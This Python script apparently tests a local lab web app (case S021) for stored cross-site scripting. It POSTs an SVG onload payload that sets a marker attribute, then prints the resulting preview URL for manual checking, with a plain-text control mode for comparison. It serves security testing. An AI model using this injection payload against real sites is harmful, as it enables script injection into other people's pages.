#!/usr/bin/env python3
import argparse
import urllib.error
import urllib.parse
import urllib.request
from urllib.parse import urljoin


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_url(base: str, path: str) -> str:
    return urljoin(base.rstrip("/") + "/", path.lstrip("/"))


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:4280")
    parser.add_argument("--submit-path", default="/submit.php")
    parser.add_argument("--mode", choices=["normal", "test"], default="test")
    args = parser.parse_args()
    submit_url = build_url(args.base, args.submit_path)
    if args.mode == "normal":
        title, body = "S021 普通对照", "普通正文S021"
    else:
        title = "S021 测试"
        body = '<svg onload="document.body.setAttribute(\'data-s021\',\'xss\')"></svg>'
    data = urllib.parse.urlencode({"title": title, "body": body}).encode("utf-8")
    req = urllib.request.Request(submit_url, data=data, method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"})
    opener = urllib.request.build_opener(NoRedirect)
    try:
        resp = opener.open(req, timeout=10)
        status, headers = resp.status, resp.headers
        resp.close()
    except urllib.error.HTTPError as e:
        status, headers = e.code, e.headers
        e.close()
    print("submit_url =", submit_url)
    print("status =", status)
    loc = headers.get("Location") if headers is not None else None
    if not loc:
        print("未得到 Location；请检查 submit.php 路径、是否返回 303，或查看服务端日志。")
        return 1
    preview_url = urljoin(submit_url, loc)
    print("preview_url =", preview_url)
    print("请在浏览器打开 preview_url。普通模式对照应无 data-s021；测试模式需人工观察。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
